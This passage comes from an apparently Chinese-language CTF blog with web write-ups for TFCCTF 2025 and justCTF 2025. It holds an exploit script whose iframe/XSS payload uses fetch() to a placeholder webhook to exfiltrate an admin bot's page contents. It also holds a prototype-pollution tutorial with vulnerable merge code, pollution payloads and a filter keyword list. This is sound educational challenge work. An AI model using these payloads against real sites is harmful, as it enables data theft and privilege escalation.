class="string">&quot;author&quot;</span>] != session[<span class="string">&quot;username&quot;</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Unauthorized&quot;</span>, <span class="number">403</span></span><br><span class="line">    <span class="comment"># 若id存在 且 用户为作者，将post（包含用户输入title和description）传入render_template函数</span></span><br><span class="line">    resp = make_response(render_template(<span class="string">&quot;post.html&quot;</span>, post=post))</span><br><span class="line">    resp.headers[<span class="string">&quot;Content-Security-Policy&quot;</span>] = <span class="string">&quot;script-src &#x27;none&#x27;; style-src &#x27;self&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure>

<p>用户访问 <code>/report</code> 页面时会触发机器人访问</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/report&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">report</span>():</span><br><span class="line">    url = request.form.get(<span class="string">&#x27;url&#x27;</span>)   <span class="comment"># 获取data部分的url</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Missing url&#x27;</span>, <span class="number">400</span></span><br><span class="line">    <span class="comment"># 创建线程执行 run_admin_bot 函数</span></span><br><span class="line">    Thread(target=_run_admin_bot, args=(url,), daemon=<span class="literal">True</span>).start()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Report queued&#x27;</span>, <span class="number">202</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_run_admin_bot</span>(<span class="params">target_url: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 将 url 作为参数传递给bot</span></span><br><span class="line">        bot.run_report(target_url, ADMIN_USERNAME, ADMIN_PASSWORD)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[BOT] Done&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[BOT] Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>bot <code>report</code>操作实际是以管理员身份登录和访问待 <code>report</code> 的 <code>url</code></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">run_report</span>(<span class="params">url, username, password</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        driver = webdriver.Chrome(service=service, options=options)</span><br><span class="line">        <span class="comment"># 1.以管理员身份登录</span></span><br><span class="line">        driver.get(<span class="string">f&quot;http://127.0.0.1:5000/login?username=<span class="subst">&#123;username&#125;</span>&amp;password=<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># Wait until page is loaded (document.readyState == &quot;complete&quot;)</span></span><br><span class="line">        WebDriverWait(driver, <span class="number">10</span>).until(</span><br><span class="line">            <span class="keyword">lambda</span> d: d.execute_script(<span class="string">&quot;return document.readyState&quot;</span>) == <span class="string">&quot;complete&quot;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2.访问 report page url</span></span><br><span class="line">        driver.get(url)</span><br><span class="line">        WebDriverWait(driver, <span class="number">10</span>).until(</span><br><span class="line">            <span class="keyword">lambda</span> d: d.execute_script(<span class="string">&quot;return window.reportReady === true&quot;</span>)</span><br><span class="line">        )</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Report page fully loaded&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>结合 <code>flag</code> 存放在管理员的 <code>post/0</code> 中，突破点在触发机器人执行report，以管理员的身份登录之后去访问某个<code>url</code>，若该<code>url</code>包含恶意链接，使得机器人在访问时将其<code>cookie</code>或者之前访问 <code>post/0</code> 的内容带出来，即可获得<code>flag</code></p>
<p><code>exp</code>如下：</p>
<p>注：<code>credentialless</code> 的核心作用是：让 iframe 请求不带 cookie，适用于跨域信息泄露场景</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">URL = <span class="string">&quot;https://webless-156e7e4ba10d8dc9.challs.tfcctf.com&quot;</span></span><br><span class="line"></span><br><span class="line">solution = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;iframe src=&quot;/post/0&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&lt;iframe credentialless src=&quot;/login?username=&lt;script&gt;fetch(`https://WEBHOOOK/$&#123;btoa(top.window.frames[0].document.body.innerText.substr(20))&#125;`)&lt;/script&gt;&amp;password=a&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">s.post(URL+<span class="string">&quot;/register&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;test&quot;</span>&#125;)</span><br><span class="line">s.post(URL+<span class="string">&quot;/create_post&quot;</span>, data=&#123;<span class="string">&quot;title&quot;</span>: <span class="string">&quot;LEAK&quot;</span>, <span class="string">&quot;description&quot;</span>: solution, <span class="string">&quot;hidden&quot;</span>: <span class="string">&quot;off&quot;</span>&#125;)</span><br><span class="line">s.post(URL+<span class="string">&quot;/report&quot;</span>, data=&#123;<span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://127.0.0.1:5000/post/1&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Check the webhook&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>poyload</code>的解释如下：</p>
<p>用户创建的post中包含solution，</p>
<p>当bot通过<code>&quot;http://127.0.0.1:5000/post/1&quot;</code> 访问时，返回的页面中包含solution；bot首先会访问 <code>src=“post/0”</code> ，然后会访问 <code>src=&quot;/login?username=&lt;script&gt;fetch(......)$&#123;btoa(top.window.frames[0].document.body.innerText.substr(20))&#125;</code></p>
<p>在访问后者时会获取前一帧显示的内容的前20个字符，将通过base64编码后发送到<code>https://WEBHOOOK</code>，即将flag的值发送出来了</p>
<p><img src="/image-20250902224454450.png" alt="image-20250902224454450"></p>
<h3 id="WEB-DOM"><a href="#WEB-DOM" class="headerlink" title="WEB-DOM"></a>WEB-DOM</h3><p>参考链接：<a target="_blank" rel="noopener" href="https://github.com/Eclso/Eclso.github.io/blob/11bb3cbcd4d305a895efd57c96979b6cc90d6519/_posts/2025-09-1-TFCCTF-DOM-Notify.md">https://github.com/Eclso/Eclso.github.io/blob/11bb3cbcd4d305a895efd57c96979b6cc90d6519/_posts/2025-09-1-TFCCTF-DOM-Notify.md</a></p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/dom-based/dom-clobbering">https://portswigger.net/web-security/dom-based/dom-clobbering</a></p>
<p>server响应配置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;name&quot;: &quot;invalid-value&quot;, &quot;observedAttribute&quot;: &quot;aria-label&quot;&#125;]</span><br></pre></td></tr></table></figure>

<p><img src="/image-20250910160934444.png" alt="image-20250910160934444"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/09/02/TFCCTF2025/" data-id="cuidX075fnWBRvwCLE5XdvuNu" data-title="TFCCTF2025 web" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-justCTF2025" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/08/10/justCTF2025/" class="article-date">
  <time class="dt-published" datetime="2025-08-10T10:20:25.000Z" itemprop="datePublished">2025-08-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/08/10/justCTF2025/">justCTF2025 web</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="justCTF-2025"><a href="#justCTF-2025" class="headerlink" title="justCTF 2025"></a>justCTF 2025</h2><h3 id="positive-player"><a href="#positive-player" class="headerlink" title="positive_player"></a>positive_player</h3><h4 id="前置知识–JS原型链污染"><a href="#前置知识–JS原型链污染" class="headerlink" title="前置知识–JS原型链污染"></a>前置知识–JS原型链污染</h4><h5 id="原型链概念"><a href="#原型链概念" class="headerlink" title="原型链概念"></a>原型链概念</h5><p>JavaScript 的每个对象拥有一个原型对象，以该原型为模板、继承方法和属性；原型对象也可能拥有原型，并从中继承方法和属性，以此类推。这种关系常被称为<strong>原型链</strong> (prototype chain)。</p>
<p>任何对象的祖先原型都是 <code>object.prototype</code>。</p>
<h6 id="相关属性"><a href="#相关属性" class="headerlink" title="相关属性"></a>相关属性</h6><p><strong>一、<em>proto</em>_ 属性</strong></p>
<p>每个对象实例都有的一个内部属性，指向该对象的“原型对象”，即该对象从哪里继承属性和方法</p>
<p>可通过 <code>__proto__</code> 访问其原型对象</p>
<p><strong>二、prototype 属性</strong></p>
<p>函数（包括构造函数）的一个属性</p>
<p>本质上是一个模板对象，新实例会继承它上面的属性和方法</p>
<p><strong>三、constructor 属性</strong></p>
<p>默认存在于函数的 <code>prototype</code> 对象上。</p>
<p>指向创建该 <code>prototype</code> 对象的构造函数本身。如 <code>A.prototype.constructor</code> 默认指向 <code>A</code>。</p>
<h6 id="重要关系"><a href="#重要关系" class="headerlink" title="重要关系"></a>重要关系</h6><p>任意对象可通过属性 <code>__proto__</code> 访问其原型对象，即 <code>obj.__proto__ == Object.prototype</code></p>
<p>实例对象可以通过原型链访问到 <code>constructor</code> 属性，即：<code>obj.constructor.prototype</code> &#x3D;&#x3D;&#x3D; <code>Object.prototype</code>。比如：</p>
<h5 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h5><p>JavaScript类的所有属性都允许被公开的访问和修改，包括属性 <code>__proto__</code> ，<code>constructor</code>和<code>prototype</code>。</p>
<p>原型污染指的是攻击者能够修改应用程序或库使用的对象原型（通常是 <code>Object.prototype</code>）的属性，且被所有经过该原型链的对象所继承，从而导致不可预期的行为，如拒绝服务攻击（通过触发JavaScript异常）或者远程代码执行等。</p>
<p>原型链污染目的是在<code>Object.prototype</code>上造成污染，主要有两种场景：</p>
<p>​	不安全的对象递归合并</p>
<p>​	按路径定义属性</p>
<h6 id="不安全的对象递归合并"><a href="#不安全的对象递归合并" class="headerlink" title="不安全的对象递归合并"></a>不安全的对象递归合并</h6><p>递归合并函数<code>merge()</code>的基本逻辑和代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 符合模式一：obj[a][b] = value</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> target[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; <span class="keyword">typeof</span> source[key] === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">      <span class="title function_">merge</span>(target[key], source[key]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      target[key] = source[key];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>若 <code>source</code> 包含<strong>可枚举</strong>属性 <code>__proto__</code>， 则可以新增&#x2F;修改 <code>tagret[__proto__]</code> 属性</p>
<p>以下代码存在原型链污染漏洞：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line"><span class="title function_">merge</span>(obj, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;isAdmin&quot;: true&#125;&#125;&#x27;</span>));</span><br><span class="line"><span class="comment">// 此时 obj.__proto__.isAdmin = true</span></span><br><span class="line"><span class="comment">// 而 obj.__proto__ 就是 Object.prototype（因为 obj 是 &#123;&#125;）</span></span><br><span class="line"><span class="comment">// 所以 Object.prototype.isAdmin = true</span></span><br><span class="line"><span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user.<span class="property">isAdmin</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>即使 <code>user</code> 是新对象，也“自动”获得了 <code>isAdmin: true</code>。</p>
<h6 id="按路径定义属性"><a href="#按路径定义属性" class="headerlink" title="按路径定义属性"></a>按路径定义属性</h6><p>有些JavaScript库的函数支持根据指定的路径修改或定义对象的属性值。如以下的函数：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将对象object的指定路径path的属性值修改为value</span></span><br><span class="line"><span class="title function_">theFunction</span>(object, path, value)</span><br></pre></td></tr></table></figure>

<p>如果攻击者可以控制路径<code>path</code>的值，那么将路径设置为<code>_proto_.value</code>，运行theFunction函数后就有可能将<code>value</code>属性注入到object的原型中</p>
<p>如joint.js中的代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> setByPath = <span class="keyword">function</span>(<span class="params">obj, path, value, delimiter</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> keys = <span class="title class_">Array</span>.<span class="title function_">isArray</span>(path) ? path : path.<span class="title function_">split</span>(delimiter || <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> last = keys.<span class="property">length</span> - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> diver = obj;</span><br><span class="line">    <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; i &lt; last; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> key = keys[i];</span><br><span class="line">        <span class="keyword">const</span> value = diver[key];</span><br><span class="line">        <span class="comment">// diver creates an empty object if there is no nested object under such a key.</span></span><br><span class="line">        <span class="comment">// This means that one can populate an empty nested object with setByPath().</span></span><br><span class="line">        diver = value || (diver[key] = &#123;&#125;); <span class="comment">//自动创建中间层级：如果路径中的某层不存在，自动创建为&#123;&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    diver[keys[last]] = value;</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>setByPath</code>函数在对象 <code>obj</code> 中，将 <code>path</code> 路径对应的属性设置为 <code>value</code></p>
<p>输入以下的路径，那就会造成原型污染：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jointjs = <span class="built_in">require</span>(<span class="string">&quot;jointjs&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Before : &quot;</span> + obj.<span class="property">polluted</span>);</span><br><span class="line">jointjs.<span class="property">util</span>.<span class="title function_">setByPath</span>(&#123; &#125;, <span class="string">&#x27;__proto__/polluted&#x27;</span>, <span class="string">&quot;yes&quot;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;After : &quot;</span> + obj.<span class="property">polluted</span>);</span><br></pre></td></tr></table></figure>

<h5 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h5><h6 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h6><p>假设后端检查权限，通过污染让所有对象都有 <code>isAdmin: true</code> → 直接获得管理员权限</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (user.<span class="property">isAdmin</span>) <span class="title function_">grantAdminAccess</span>();</span><br></pre></td></tr></table></figure>

<h6 id="绕过属性检查"><a href="#绕过属性检查" class="headerlink" title="绕过属性检查"></a>绕过属性检查</h6><p>如果污染了 <code>Object.prototype.hasOwnProperty</code>，就可以绕过检查</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">  <span class="keyword">if</span> (obj.<span class="title function_">hasOwnProperty</span>(key)) &#123;</span><br><span class="line">    <span class="comment">// 以为安全</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h6><p>通常发生在代码程序执行了对象上的一个特殊属性。如</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(someobject.<span class="property">someattr</span>)</span><br></pre></td></tr></table></figure>

<p>在这种情况下，如果攻击者污染了 <code>Object.prototype.someattr</code> ，那么就可能导致远程代码执行。</p>
<h6 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h6><p>通常发生在 <code>Object</code> 对象持有的一些方法被隐式调用（如<code>toString</code> 和 <code>valueOf</code>）。</p>
<p>攻击者可以污染 <code>Object.prototype.someattr</code> 并改变为一个程序非预期的值，如<code>Int</code> 或 <code>Object</code>，可能导致程序无法正常工作，从而造成DoS。</p>
<h5 id="原型污染防范"><a href="#原型污染防范" class="headerlink" title="原型污染防范"></a>原型污染防范</h5><ol>
<li><p>过滤关键字： <code>__proto__</code> 、 <code>prototype</code>和 <code>constructor</code> 属性</p>
</li>
<li><p>避免使用不规范的递归。即使使用也要严格检查<code>key</code>，不能是<code>__proto__</code>和<code>constructor</code>。</p>
</li>
<li><p>考虑使用不带原型的对象，从而打断原型链。如<code>Object.create(null)</code>。</p>
</li>
<li><p>使用<code>Map</code>替换<code>Object</code>。</p>
</li>
</ol>
<h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>由 Gemini 生成的 Express 应用，包括用户注册、登录功能和自定义主题等功能。</p>
<p>注册用户 user1&#x2F;123 ，登录之后可看到的页面如右图</p>
<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p><strong>一、定位关键字 <code>flag</code></strong></p>
<p>分析源码，搜索关键字 <code>flag</code> ，发现如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 15. Define the `/flag` endpoint (protected)</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res, next</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(users[req.<span class="property">session</span>.<span class="property">userId</span>].<span class="property">isAdmin</span> == <span class="literal">true</span>)&#123; </span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="variable constant_">FLAG</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;Not admin :(&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>代码逻辑如下：</p>
<p>1）用户访问 &#x2F;flag 页面时触发该处理器</p>
<p>2）首先验证用户是否成功登录</p>
<p>3）若成功登录，判断是否具备管理员权限；若具备则返回FLAG，反之返回 Not admin</p>
<p>结合上述分析，需要一个具备管理员权限的用户，登录成功后访问 &#x2F;flag 路径即可获得FLAG。</p>
<p><strong>二、定位危险函数 <code>deepMerge</code></strong> </p>
<p>分析源码发现，定义了递归合并函数 <code>deepMerge</code> ，代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 6. A function to recursively merge objects</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">deepMerge</span> = (<span class="params">target, source</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">    <span class="keyword">if</span> (source[key] <span class="keyword">instanceof</span> <span class="title class_">Object</span> &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">      <span class="title class_">Object</span>.<span class="title function_">assign</span>(source[key], <span class="title function_">deepMerge</span>(target[key], source[key]));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title class_">Object</span>.<span class="title function_">assign</span>(target || &#123;&#125;, source);</span><br><span class="line">  <span class="keyword">return</span> target;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>函数作用是将 <code>source</code> 对象的所有可枚举属性地复制到 <code>target</code>（有可能为{}）上。</p>
<p>存在递归合并函数时，考虑原型链污染漏洞。</p>
<p><strong>三、分析原型链污染的可能性</strong></p>
<p>查找函数调用链，发现 <code>app.get(&#39;theme&#39;,....)</code> 调用 <code>deepMerge</code> ，部分代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 15. Define the `/theme` endpoint (protected)</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/theme&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  ......</span><br><span class="line">  <span class="comment">// 解析请求参数，过滤关键字 __proto__，prototype，constructor等</span></span><br><span class="line">  <span class="keyword">const</span> parsedUpdates = <span class="title function_">parseQueryParams</span>(queryString);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Object</span>.<span class="title function_">keys</span>(parsedUpdates).<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 调用deepMerge</span></span><br><span class="line">    user.<span class="property">themeConfig</span> = <span class="title function_">deepMerge</span>(user.<span class="property">themeConfig</span>, parsedUpdates);</span><br><span class="line">  &#125;</span><br><span class="line">  ......</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>但是在调用 <code>parseQueryParams</code> 函数之前，先调用<code>parseQueryParams</code>函数解析请求参数，过滤了 <code>[&#39;__proto__&#39;, &#39;prototype&#39;, &#39;constructor&#39;]</code> 等关键字。代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 7. A function to parse a query string with dot-notation keys.</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">parseQueryParams</span> = (<span class="params">queryString</span>) =&gt; &#123;</span><br><span class="line">  .....</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> [key, value] <span class="keyword">of</span> params.<span class="title function_">entries</span>()) &#123;</span><br><span class="line">    <span class="keyword">const</span> path = key.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    .....</span><br><span class="line">      <span class="comment">// 过滤关键字</span></span><br><span class="line">      <span class="keyword">if</span>([<span class="string">&#x27;__proto__&#x27;</span>, <span class="string">&#x27;prototype&#x27;</span>, <span class="string">&#x27;constructor&#x27;</span>].<span class="title function_">includes</span>(part))&#123;</span><br><span class="line">        part = <span class="string">&#x27;__unsafe$&#x27;</span> + part;</span><br><span class="line">      &#125;</span><br><span class="line">      ......</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>故直接污染 <code>object.prototype.isAdmin</code>的思路行不通</p>
<p><strong>四、原型链污染扩展</strong></p>
<p>再次查看获取 <code>flag</code> 的相关代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 15. Define the `/flag` endpoint (protected)</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res, next</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="comment">// 关键判断</span></span><br><span class="line">  <span class="keyword">if</span>(users[req.<span class="property">session</span>.<span class="property">userId</span>].<span class="property">isAdmin</span> == <span class="literal">true</span>)&#123; </span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="variable constant_">FLAG</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;Not admin :(&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>关键代码是 <code>users[req.session.userId].isAdmin == true</code> ，其中：</p>
<p>​	<code>req.session.userId</code> 在用户登录认证通过后赋值为 <code>username</code> </p>
<p>​	<code>users</code> 初始化为 {} ，在用户注册成功后存入数据 <code>&#123; username: &#123; password, userThemeConfig, isAdmin &#125; &#125;</code></p>
<p>可知<code>users.__proto__</code> 就是 <code>Object.prototype</code> ，如下：</p>
<style>.puskeihwjfnc{zoom: 67%;}</style><img src="/2025/08/10/justCTF2025/image-20250812193235289-1762219779844-12.png" class="puskeihwjfnc" alt="image-20250812193235289-1762219779844-12">

<p>故<code>users</code> 除了自身的属性：<code>user1</code> 之外；还有继承自原型（即 <code>Object</code>）的属性，如 <code>constructor</code>，<code>hasOwnProperty</code>，<code>isPrototypeOf</code> 和 <code>toString</code> 等</p>
<p><code>users[req.session.userId]</code> 本质上是获取users的一个属性，所以 <code>req.session.userId</code> 不一定是合法的用户名（如 <code>user1</code>），也可以是 <code>users</code> 的其它属性（如 <code>constructor</code>，<code>hasOwnProperty</code>，<code>isPrototypeOf</code> 和 <code>toString</code> 等），只要保证<code>users[某属性]</code> 返回非空的结果即可</p>
